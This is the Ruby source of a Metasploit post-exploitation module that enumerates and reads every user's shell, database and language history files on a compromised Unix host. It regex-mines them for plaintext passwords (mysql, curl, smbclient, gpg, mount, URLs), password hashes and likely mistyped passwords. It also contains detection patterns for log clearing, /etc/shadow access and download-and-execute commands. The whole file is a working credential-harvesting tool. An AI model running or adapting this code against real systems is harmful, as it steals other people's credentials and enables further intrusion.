require 'msf/core'
require 'core/post/staekka'
require 'core/post/staekka/file'
require 'core/post/staekka/unix'
require 'core/post/unix/commands'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Staekka
  # include Msf::Post::Staekka::File
  include Msf::Post::Staekka::Unix
  include Msf::Post::Unix::Commands
  include Msf::Post::Updatedb

  def initialize(info = {})
    super(update_info(info,
                      'Name'          => 'Enumerate History Files',
                      'Description'   => %q{Analyse (shell) history files},
                      'Author'        => [ 'jot'],
                      'SessionTypes'  => [ 'shell' ]))
    register_options(
      [
        OptBool.new('USE_UPDATEDB', [ false, 'Use an updatedb database and search for filenames instead of full path', true]),
        OptString.new('FILES', [ false, 'A special hist file (full path or ~/ for home directory of every user)']),
        OptBool.new('FASTCHECK', [ false, 'Do only check most common history files (faster check)', true])
      ], self.class
    )
  end

  def run
    all_history_files.each do |file|
      check_symlink(file)
      data = read_history(file)
      next if data.nil?
      data = clear_history(data)
      grep_passwords(data, file)
      grep_hashes(data, file)
      grep_misc(data, file)
      grep_hacked(data, file)
      guess_typos(data, file)
    end
  end

  def all_history_files
    out = []
    files = if datastore['FILES']
              datastore['FILES'].split(" ")
            elsif datastore['FASTCHECK'] == 'true'
              ["~/.bash_history", "~/.sh_history", "~/.mysql_history"]
            else
              shell_history_files + database_history_files + programming_history_files + misc_history_files
            end
    files.flatten!
    files.compact!
    files.uniq!
    files.each do |file|
      file.strip!
      next if file.empty?
      if file.start_with? '~/'
        file.sub!("~", '')
        enum_user_directories.each do |home|
          tmp = home + file
          tmp.gsub!('//', '/')
          out << tmp if exists?(tmp)
        end
      elsif (file.start_with? '/') || (file.start_with? './') || (file.start_with? '..')
        out << file if exists?(file)
      else
        out.concat find_files(file)
      end
    end
    out
  end

  def shell_history_files
    return datastore['HISTFILES'].split(" ") if datastore['HISTFILES']
    default_files = ['~/.bash_history',
                     '~/.sh_history',
                     '~/.history',
                     '~/.zsh_history',
                     '~/.ash_history',
                     '~/.csh_history',
                     '~/.tcsh_history',
                     '~/.ksh_history',
                     '~/.shell_history',
                     '~/.zhistory',
                     '~/.ksh_history']
    default_files
  end

  def database_history_files
    return datastore['HISTFILES'].split(" ") if datastore['HISTFILES']
    default_files = [	'~/.mysql_history',
                      '~/.sqlite_history',
                      '~/.psql_history',
                      '~/.sqlplus_history',
                      '~/.dbshell']
    default_files
  end

  def programming_history_files
    return datastore['HISTFILES'].split(" ") if datastore['HISTFILES']
    default_files = [	'~/.php_history',
                      '~/.irb_history',
                      '~/.pry_history',
                      '~/.pyhistory',
                      '~/.python_history',
                      '~/.scapy_history',
                      '~/.cpan/histfile']
    default_files
  end

  def misc_history_files
    default_files = [	'~/.mc/history',
                      '~/.atftp_history',
                      # '~/.pyshellhistory', # https://github.com/praetorian-inc/pyshell
                      '~/.rush/history']
    default_files
  end

  def check_symlink(file)
    if symlink?(file)
      out = cmd_exec("ls -l #{file}")
      print_info(file + " is a symlink: " + out)
    end
  end

  def read_history(file)
    data = nil
    if readable?(file)
      print_good(file + " is readable")
      data = read_file(file, false, true)
    end
    data
  end

  def clear_history(data)
    # in some cases (HP-UX) there are binary characters
    # removing them
    data.delete!("\000")
    data.delete!("\001")
    data.delete!("\002")

    # remove white spaces
    data.gsub!(/^\s*/, "")
    # remove numbers at the beginning of the line
    data.gsub!(/^\d*\s/, "")
    data
  end

  def grep_signature(hist, signatures, file)
    hist.each_line do |line|
      line.strip!
      signatures.each_pair do |search, message|
        rx = Regexp.new(search)
        out = rx.match(line)
        next unless out
        print_status(message + " in file " + file + " : " + line)
        vprint_status("Search: " + search)
        found = out[1]
        print_good "Found: #{found}" unless found.nil? || found.empty?
      end
    end
  end

  def grep_passwords(hist, file)
    signatures = { 'http[s|]://.*:(.*?)@.*' => 'Password in URL',
                   'mysql.*--password=(.*?)\s*' => 'MySQL password',
                   'IDENTIFIED\s*BY\s*(.*)' => 'SQL password',
                   'mysqldump.*\s-p\s*(\w*?)\s' => 'Mysql password',
                   'smbclient.*--authentication-file.(\w*)' => 'Password file',
                   'mount.*credentials=' => 'Password file',
                   'mount.*password=(\w*)' => 'mount password',
                   'smbclient.*-U.\w%(.*)' => 'Samba password',
                   'cryptsetup.*-d' => 'Password file',
                   'cryptsetup.*--key-file' => 'Password file',
                   'ftp://.*:(.*?)@.*' => 'Password in URL',
                   'gpg.*--passphrase\s*(.*)' => 'GPG password',
                   'gpg.*--passphrase-file' => 'Password file',
                   # 'cvs.*:(\w*)' => 'CVS password',
                   'curl.*-E.*' => 'CURL password',
                   'cryptsetup.*luksAddKey' => 'Password file',
                   'mysql.*\s-p\s*(\w*?)\s' => 'MySQL password',
                   'openssl.*passwd' => 'password?',
                   'smbmount.*username=.*:(\w*)' => 'SAMBA password',
                   'mount.*-o.username=.*:(\w*)' => 'Mount password',
                   'curl.*-U.*:(\w*)' => 'CURL password',
                   'curl.*-u.*:(\w*)' => 'CURL password',
                   'curl.*--user.*:(\w*)' => 'CURL password',
                   'ssh-keygen' => 'SSH key file',
                   'password=(\w*)' => 'Password?',
                   'mysql_connect' => 'MySQL password?' }
    # 'passw' => 'PASSWORD?',
    grep_signature(hist, signatures, file)
  end

  def grep_hashes(hist, file)
    # more regex: https://github.com/AnimeshShaw/Hash-Algorithm-Identifier/blob/master/HashIdentifier.py
    signatures = {  '([^a-fA-F0-9]|^)([a-fA-F0-9]{32})([^a-fA-F0-9]|$)' => 'Md5 hash?',
                    '([^a-fA-F0-9]|^)([a-fA-F0-9]{40})([^a-fA-F0-9]|$)' => 'SHA hash?',
                    # '(\*([a-fA-F0-9]{40})([^a-fA-F0-9]|$)' => 'MySQL 5 hash?',
                    '(\$P\$[a-fA-F0-9]{31})' => 'Wordpress  hash?',
                    '(\$H\$[a-fA-F0-9]{31})' => 'PhpBB  hash?',
                    '(\$1\$.{0,8}\$[a-zA-Z0-9\/\.]{22})' => 'Unix Md5 + Salt?' }
    grep_signature(hist, signatures, file)
  end

  def grep_misc(hist, file)
    signatures = { 'http[s|]://' => 'URL.',
                   'wget\s*(.*)' => 'URL',
                   'curl\s*(.*)' => 'URL',
                   'xhost\s*(.*)' => 'X accessable ?',
                   'DISPLAY=' => 'X accessable ?',
                   'chmod\s*777\s' => 'broken permissions?' }
    # './(.*)' => 'Programm not in PATH?',
    grep_signature(hist, signatures, file)
  end

  def grep_hacked(hist, file)
    signatures = { 'exploit' => 'Exploit?',
                   '0day' => 'Exploit?',
                   'expl0it' => 'Exploit?',
                   'spl[o|0]it' => 'Exploit?',
                   'r00t' => 'Common exploit string',
                   '0wned' => 'Common exploit string',
                   '0wn3d' => 'Common exploit string',
                   'h4ck' => 'Common exploit string',
                   'haX[o|0]r' => 'Common exploit string',
                   '>>\s*/etc/passwd' => 'Common exploit string',
                   '>>\s*/etc/shadow' => 'Common exploit string',
                   '.bash_history' => 'Access to shell history?',
                   '.sh_history' => 'Access to shell history?',
                   '.history' => 'Access to shell history?',
                   '.zsh_history' => 'Access to shell history?',
                   '.csh_history' => 'Access to shell history?',
                   '.tcsh_history' => 'Access to shell history?',
                   '.ksh_history' => 'Access to shell history?',
                   '^history\s*$' => 'Access to history?',
                   '^history\s*-c' => 'Clearing shell history',
                   'vi[m|].*.bash_history' => 'Clearing shell history?',
                   'vi[m|].*.sh_history' => 'Clearing shell history?',
                   'vi[m|].*.history' => 'Clearing shell history?',
                   'vi[m|].*.zsh_history' => 'Clearing shell history?',
                   'vi[m|].*.csh_history' => 'Clearing shell history?',
                   'vi[m|].*.tcsh_history' => 'Clearing shell history?',
                   'vi[m|].*.ksh_history' => 'Clearing shell history?',
                   '>\s*.sh_history' => 'Clearing/changing shell history?',
                   '>\s*.bash_history' => 'Clearing/changing shell history?',
                   '>\s*.zsh_history' => 'Clearing/changing shell history?',
                   '>\s*.csh_history' => 'Clearing/changing shell history?',
                   '>\s*.tcsh_history' => 'Clearing/changing shell history?',
                   '>\s*.ksh_history' => 'Clearing/changing shell history?',
                   '>\s*.history' => 'Clearing/changing shell history?',
                   'rm\s.*.bash_history' => 'Clearing shell history?',
                   'rm\s.*.sh_history' => 'Clearing shell history?',
                   'rm\s.*.history' => 'Clearing shell history?',
                   'rm\s.*.zsh_history' => 'Clearing shell history?',
                   'rm\s.*.csh_history' => 'Clearing shell history?',
                   'rm\s.*.tcsh_history' => 'Clearing shell history?',
                   'rm\s.*.ksh_history' => 'Clearing shell history?',
                   'HISTFILE' => 'Avoiding shell history?',
                   'HISTFILESIZE' => 'Avoiding shell history?',
                   'HISTCMD' => 'Avoiding shell history?',
                   'HISTCONTROL' => 'Avoiding shell history?',
                   'HISTIGNORE' => 'Avoiding shell history?',
                   'HISTSIZE' => 'Avoiding shell history?',
                   'SAVEHIST' => 'Avoiding shell history?',
                   'HISTCHARS' => 'Avoiding shell history?',
                   '/etc/shadow' => 'Password hashes',
                   '/etc/master.passwd' => 'Password hashes',
                   '/etc/security/passwd' => 'Password hashes',
                   'packetstorm' => 'Downloading from packetstorm?',
                   'exploit-db' => 'Downloading from exploit-db?',
                   'chmod\s*777' => 'Insecure file permissions (stupid user?)',
                   'chmod\s*1777' => 'Insecure file permissions (stupid user?)',
                   'chmod\s*\+s' => 'Insecure file permissions (stupid user?)',
                   'LD_PRELOAD' => 'maybe some exploit?',
                   'psybnc' => 'irc gateway',
                   'vi[m|]\s.*/var/log/' => 'Clearing logs?',
                   'vi[m|]\s.*/var/adm/' => 'Clearing logs?',
                   'rm\s.*/var/log/' => 'Clearing logs?',
                   'rm\s.*/var/adm/' => 'Clearing logs?',
                   '/var/adm/lastlog' => 'Clearing logs?',
                   '/var/log/lastlog' => 'Clearing logs?',
                   '/var/adm/pacct' => 'Clearing logs?',
                   '/var/adm/acct' => 'Clearing logs?',
                   '/etc/security/lastlog' => 'Clearing logs?',
                   '/etc/security/failedlogin' => 'Clearing logs?',
                   '/usr/spool/mqueue/syslog' => 'Clearing logs?',
                   'wtmp[x|]' => 'Clearing logs?',
                   'utmp' => 'Clearing logs?',
                   'btmp' => 'Clearing logs?',
                   'uname\s*-a\s*;\s*id\s*;' => 'Common command after getting a shell',
                   'wget.*;.*chmod\s.*' => 'Download and execute?' }
    grep_signature(hist, signatures, file)
  end

  def guess_typos(data, file)
    ignore_list = [ # shell included
      'export', 'setenv', 'cd', 'source', 'history', 'set',
      'unset', 'path', 'exit', 'bind', 'break', 'builtin',
      'caller', 'command', 'compgen', 'complete', 'continue',
      'declare', 'typeset', 'dirs', 'disown', 'echo', 'enable',
      'eval', 'exec', 'fc', 'getopts', 'hash', 'jobs', 'kill',
      'let', 'popd', 'printf', 'pushd', 'pwd', 'read',
      'readonly', 'return', 'shift', 'shopt', 'suspend',
      'test', 'times', 'trap', 'type', 'ulimit', 'umask',
      'unalias', 'wait', 'run', 'alias', 'fg', 'bg', 'logout',
      'logoff', 'quit',
      # aliases and common errors
      'll', 'sl', 'cd..', 'cd.', 'edit', 'help', 'dir',
      'ipconfig', 'su-', 'alloc', 'bindkey',
      'bs2cmd', 'bye', 'case', 'builtins', 'chdir',
      'default', 'echotc', 'else', 'end', 'endif',
      'endsw', 'filetest', 'foreach', 'getspath',
      'getxvers', 'glob', 'goto', 'hup', 'inlib',
      'limit', 'log', 'login', 'ls-F', 'migrate',
      'newgrp', 'nice', 'nohup', 'notify', 'onintr',
      'printenv', 'rehash', 'repeat', 'rootnode',
      'sched', 'setpath', 'setspath', 'settc', 'setty',
      'setxvers', 'stop', 'telltc', 'termname', 'time',
      'uncomplete', 'universe', 'unsetenv', 'ver', 'warp',
      'watchlog', 'where', 'which', 'while', 'beepcmd',
      'sshd', 'pico', 'adduser', 'useradd', 'htop',
      'icewm', 'xine', 'xmms', 'del', 'move', 'apt-get',
      'ifconfig', 'linuxconf', 'config', 'irssi',
      'reboot', 'shutdown', 'halt', 'clock', 'for',
      'tcpdump', 'emacs', 'pine', 'cwdcmd', 'jobcmd',
      'helpcommand', 'periodic', 'precmd', 'postcmd',
      'shell'
    ]
    known = []
    no_tool = []
    unknown_tool = []
    data.each_line do |line|
      line.strip!

      next if line.empty?
      # ignore less than 3 characters
      next if line.length < 4

      # ignore reported lines
      next unless known.grep(line).empty?

      next unless line =~ /^(\w*)/
      tool = Regexp.last_match[1]
      if tool.empty?
        # puts "Tool=[#{tool}]\tline=[#{line}]"
        # ignore ./command
        next if line.start_with? "./"
        # ignore /bin/command
        next if line =~ /^\/\w*\/\w/
        # ignore ~/command
        next if line =~ /^~\/\w*/
        # ignore including environment vars to shell . env
        next if line =~ /^\.\s*/
        # ignore `command`
        next if line =~ /^`.*`/
        # might be a password?
        no_tool << line
        known << line
      else
        next unless ignore_list.grep(tool).empty?
        next unless known.grep(tool).empty?

        if installed?(tool)
          known << tool
        else
          known << tool
          unknown_tool << line
        end
      end
      # else
      # puts "NO tool:|#{line.dump}|"
    end
    unless no_tool.empty?
      print_good "Strange lines in history file '#{file}' detected."
      print_good "Migth be a password or a typo:___________________"
      no_tool.each do |tool|
        print_good tool
      end
      print_good "_________________________________________________"
    end
    unless unknown_tool.empty?
      print_good "Unkown tools in history file '#{file}' detected."
      print_good "Migth be a password or a typo:___________________"
      unknown_tool.each do |tool|
        print_good tool
      end
      print_good "_________________________________________________"
    end
  end
end
